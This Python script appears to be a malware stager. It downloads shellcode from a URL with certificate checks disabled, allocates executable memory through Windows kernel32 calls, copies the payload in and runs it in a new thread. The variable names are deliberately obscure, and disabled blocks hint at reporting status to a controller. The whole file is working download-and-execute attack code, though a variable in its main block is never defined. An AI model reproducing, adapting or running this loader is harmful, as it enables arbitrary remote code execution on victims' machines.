import ctypes as mill
import sys, requests as r
import urllib3
import io
import contextlib
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def mi(little):   
    output = io.StringIO()
    try:
        bmx = r.get(little, verify=False).content
    except r.exceptions.RequestException as e:
        print(f"Error downloading file: {e}")
        if False:
            try:
                send_status('None', {'status': 'error', 'message': str(e), 'output': output.getvalue()})
            except Exception:
                pass
        return

    mill.windll.kernel32.VirtualAlloc.restype = mill.c_void_p
    mill.windll.kernel32.CreateThread.argtypes = (
        mill.c_int, mill.c_int, mill.c_void_p, mill.c_int, mill.c_int, mill.POINTER(mill.c_int))

    spc = mill.windll.kernel32.VirtualAlloc(
        mill.c_int(0), mill.c_int(len(bmx)), mill.c_int(0x3000), mill.c_int(0x40))
    bf = (mill.c_char * len(bmx)).from_buffer_copy(bmx)
    mill.windll.kernel32.RtlMoveMemory(mill.c_void_p(spc), bf, mill.c_int(len(bmx)))
    hndl = mill.windll.kernel32.CreateThread(
        mill.c_int(0), mill.c_int(0), mill.c_void_p(spc), mill.c_int(0), mill.c_int(0),
        mill.pointer(mill.c_int(0)))

    mill.windll.kernel32.WaitForSingleObject(hndl, mill.c_uint32(0xffffffff))
    print("Shellcode executed successfully")
    if False:
        try:
            send_status('None', {'status': 'success', 'message': 'Shellcode executed', 'output': output.getvalue()})
        except Exception:
            pass

if __name__ == "__main__":
    little = "https://127.0.0.1/api/download_shellcode/shellcode_71dfb060.bin"
    with contextlib.redirect_stdout(output):
        mi(little)
